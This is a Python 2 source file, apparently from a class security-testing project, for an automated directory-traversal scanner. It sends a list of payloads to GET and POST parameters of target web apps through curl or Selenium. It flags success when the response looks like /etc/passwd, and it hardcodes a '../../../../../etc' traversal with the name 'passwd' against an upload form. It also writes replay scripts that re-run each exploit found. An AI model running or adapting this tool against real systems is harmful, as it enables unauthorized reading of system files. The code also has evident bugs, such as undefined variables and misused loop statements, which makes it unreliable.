import json
import re
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pprint import pprint
import urllib, urllib2, cookielib, os
import webbrowser
from subprocess import check_output
import sys
from collections import OrderedDict
import httplib
import socket
from selenium.webdriver.remote.command import Command
import time

# Runtime environment settings
USE_CURL = True
RESULT = {}
LOGIN_PARAM = {}
authenticated = False

# Sample structure as follows:
# {
#     "https://app1.com/path.php": {
#         [
#              get/post,
#              param_name,
#              param_value
#         ]
#     }
# }

# Sample structure might be changed....   (20160414)
# <the base url would probably come from the filename>
# {
#     "index.php?ctg=signup": [
#         {
#             "type": "post", 
#             "param": "_qf__signup_register_personal_form"
#         }
#     ]
# }


# Initialization
try:
    with open("./input.json") as data_file:
       data = json.load(data_file, object_pairs_hook=OrderedDict)
       # data = json.load(data_file)
except:
    sys.exit('Cannot open input.json, exiting...')

try:
    with open("./reduced_payload.json") as payload_file:
        #payload = payload_file.readlines()
        payload = json.load(payload_file, object_pairs_hook=OrderedDict)
except:
    sys.exit('Cannot open payload.json, exiting...')


# # added in for CK to better understand dict
# root_url = data.keys()
# ss = ','.join(str(e) for e in root_url)
# print(ss)
# for string in ss.split(","):
#     print(string)
#     print(data[string])

# Error Handling
def generate_output_json():
    filename = "output_json_for_vuln_" + str(int(time.time()))
    op_file = open(filename + ".json", "ab")
    final_output = {}
    for k,v in RESULT.iteritems():
        final_output[k] = {'method': v[0], 'params': {'key': v[1], 'value': v[2]}}
    op_file.write(json.dumps([final_output], indent=2))
    return

def generate_patches():
    i = 0
    try:
        if not os.path.exists('generated_files'):
            os.makedirs('generated_files')
    except:
        print 'Error handling folder, cannot create Selenium scripts!'
        return

    for key, value in RESULT.iteritems():
        # ========================================
        # TO BE COMPLETED
        # Kelvin attempted to complete some things
        # ========================================
        try:
            output_file = open("./generated_files/" + `i` + ".py", 'w')
        except:
            print 'Cannot create Selenium script for URL {}'.format(key)
            next

        if (len(value) != 3):
            print 'Invalid injection value for URL {}, skipping...'.format(key)
            output_file.close()
            next
        if (value[0] == "get"):
            patch_get(output_file, key, value[1], value[2])
        elif (value[0] == "post"):
            patch_post(output_file, key, value[1], value[2])
        else:
            patch_header(output_file, key, value[1], value[2])
            #print 'No GET/POST detected for URL {}, skipping...'.format(key)
            #output_file.close()
            #next
        # print key
        # print value
        output_file.close()
        print 'Selenium script created for URL {}'.format(key)
        i += 1;

    print 'Generated Selenium scripts can be found in the generated_files folder'
    return

def patch_get(output_file, url, query_name, exploit_value):
    # most basic case where it is a simple get
    output_file.write("from selenium import webdriver\n\n")

    url = url + "?" + query_name + "=" + exploit_value

    output_file.write("url = \"" + url + "\"\n")
    output_file.write("driver = webdriver.Firefox()\n")
    output_file.write("driver.maximize_window()\n")
    output_file.write("driver.get(url)\n")
    output_file.write("\n")
    return

def patch_post(output_file, url, query_name, exploit_value):
    # most basic case where it is a simple post
    output_file.write("from selenium import webdriver\n\n")
    output_file.write("url = \"" + url + "\"\n\n")
    output_file.write("driver = webdriver.Firefox()\n")
    output_file.write("driver.maximize_window()\n")
    output_file.write("driver.get(url)\n\n")
    if isinstance(exploit_value,dict):
        for k,v in exploit_value:
            output_file.write("elem = driver.find_element_by_name(\"" + k + "\")\n")
            output_file.write("elem.send_keys(\"" + v + "\")\n")
    else:
        output_file.write("elem = driver.find_element_by_name(\"" + query_name + "\")\n")
        output_file.write("elem.send_keys(\"" + exploit_value + "\")\n")
    
    output_file.write("button = driver.find_element_by_xpath(\'//input[@type=\"submit\"]\')\n")
    output_file.write("button.click()\n")
    output_file.write("\n")
    return

def patch_header(output_file, url, query_name, exploit_value):
    # to handle header
    # TO BE COMPLETED!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    output_file.write("print 'Header handling not implemented yet for URL " + url + "'\n\n")
    return

# Helper functions
# Check if source is formatted like a password file, return True if it is
# Else print '.' as progress indicator
def vuln_found(src, fullpath, tryout_value, fieldset, action):
    text_found = re.search(r'\w*:\w:\d:\d:\w*:[\/\w]*:[\/\w]*', src)
    if text_found != None:
        RESULT[fullpath] = [action, fieldset, tryout_value]
        print "DT VULN FOUND ON " + fullpath + ". EXPLOIT: " + fieldset + "=" + str(tryout_value)
        return True
    else:
        sys.stdout.write('.')
        sys.stdout.flush()
        return False

# Handler functions
def handle_get(fullpath, fieldset):
    print "Handling GET " + fullpath
    if LOGIN_PARAM and not authenticated:
        driver = handle_login(LOGIN_PARAM)
        for parameter in fieldset["param"]:
            print "For " + parameter
            for tryout_value in payload:
                driver.get(fullpath + "?" + parameter + "=" + tryout_value)
                out = driver.page_source
                if vuln_found(out, fullpath, tryout_value, parameter, "get"):
                    break
        quit_webdriver(driver)
    elif USE_CURL:
        for parameter in fieldset["param"]:
            print "For " + parameter
            for tryout_value in payload:
                url = fullpath + "?" + parameter + "=" + tryout_value
                url = url.encode("utf-8").replace('\n','')
                out = check_output(["curl", "-k", "-sS", url])
                if vuln_found(out, fullpath, tryout_value, parameter, "get"):
                    break
    else:
        for parameter in fieldset["param"]:
            print "For " + parameter
            for tryout_value in payload:
                driver = webdriver.Firefox()
                driver.get(fullpath + "?" + parameter + "=" + tryout_value)
                out = driver.page_source
                if vuln_found(out, fullpath, tryout_value, parameter, "get"):
                    break
        quit_webdriver(driver)
    return

def handle_post(fullpath, fieldset):
    form_data = {}
    print "Handling post " + fullpath
    if LOGIN_PARAM and not authenticated:
        driver = handle_login(LOGIN_PARAM)
        driver.get(fullpath)
        for parameter in fieldset["param"]:
            form_data[parameter] = "Group3Testing"
        if "https://app1.com/pictures/upload.php" in fullpath:
            form_data["tag"] = "../../../../../etc"
            form_data["name"] = "passwd"
            for k,v in form_data.items():
                elem = driver.find_element_by_name(k)
                send_my_keys(driver, elem, v)
            driver.find_element_by_xpath('//input[@type="submit"]').click()
            elem = driver.find_element_by_xpath('//img[@src]')
            src = elem.get_attribute("src")
            driver.get(src)
            out = driver.page_source
            vuln_found(out, fullpath, form_data, parameter, "post")   
            quit_webdriver(driver)
        else:
            for parameter in fieldset["param"]:
                if "size" in parameter.lower():
                    continue
                for tryout_value in payload:
                    try:
                        elem = driver.find_element_by_name(parameter)
                    except Exception as e:
                        continue
                    send_my_keys(driver, elem, tryout_value)
                    driver.find_element_by_xpath('//input[@type="submit"]').click()
                    out = driver.page_source
                    if vuln_found(out, fullpath, tryout_value, parameter, "post"):
                        break
            quit_webdriver(driver)
    elif USE_CURL:
        for parameter in fieldset["param"]:
            print "Using cURL:\nFor " + parameter
            for tryout_value in payload:
                param = parameter + "=" + tryout_value
                out = check_output(["curl", "-k", "-sS", "--data", param, fullpath])
                if vuln_found(out, fullpath, tryout_value, parameter, "post"):
                    break
    else:
        for parameter in fieldset["param"]:
            print "Using URLlib:\nFor " + tryout_value
            for tryout_value in payload:
                # prep value to include payload
                tryout_value = {}
                tryout_value[parameter] = "a"
                tryout_data = urllib.urlencode(tryout_value)
                # submit form
                req = urllib2.Request(fullpath, tryout_data)
                rsp = urllib2.urlopen(req)
                #read return result
                html = rsp.read()
                # open... or process
                if vuln_found(out, fullpath, tryout_value, parameter, "post"):
                    break
        
    return

def handle_header(fullpath, fieldset):
    print "Header " + fullpath + " with " + str(fieldset)
    return

def handle_login(LOGIN_PARAM):
    authenticated = True
    print "I'm trying to login now."
    login_url = LOGIN_PARAM["url"]
    username_element = LOGIN_PARAM["username_element_name"]
    username_value = LOGIN_PARAM["username_value"]
    password_element = LOGIN_PARAM["password_element_name"]
    password_value = LOGIN_PARAM["password_value"]

    # To accept untrusted certs
    profile = webdriver.FirefoxProfile()
    profile.accept_untrusted_certs = True
    driver = webdriver.Firefox(firefox_profile=profile)
    driver.get(login_url)
    out = driver.page_source
    elem = driver.find_element_by_name(username_element) # To change name to the username found in input.json
    elem.send_keys(username_value) # To change value to the value found in input.json
    elem1 = driver.find_element_by_name(password_element) # To change name to the username found in input.json
    elem1.send_keys(password_value) # To change value to the value found in input.json
    button = driver.find_element_by_xpath('//input[@type="submit"]')
    button.click()

    return driver

def send_my_keys(driver, elem, value):
    if not elem.is_displayed():
        driver.execute_script('''
            var elem = arguments[0];
            var value = arguments[1];
            elem.value = value;
            ''', elem, value)
    else:
        elem.send_keys(value)

def quit_webdriver(driver):
    try:
        driver.execute(Command.STATUS)
        driver.quit()
        driver.close()
    except (socket.error, httplib.CannotSendRequest):
        pass

# Initialization of case-switch
handler = {"get": handle_get, "post": handle_post, "header": handle_header}

# For each root url (i.e. https://app3.com)...
#   Based on each given path (i.e. /windows/page.php)...
#     Pass input data to the respective method accordingly
def main():
    #print("Main started");
    for dataset in data:
        for k,v in dataset.items():
            if "login_required" in dataset.keys() and k == "login_required":
                USE_CURL = False
                path_key_exist = v.get("path", None)
                if path_key_exist is not None:
                    LOGIN_PARAM["url"] = v["path"]
                    for k1,v1 in v["param"].items():
                        LOGIN_PARAM[k1] = v1
            else:
                fieldtype = v["type"].lower()
                handler[fieldtype](k, v)
    generate_output_json()
    generate_patches()

#call main
main()


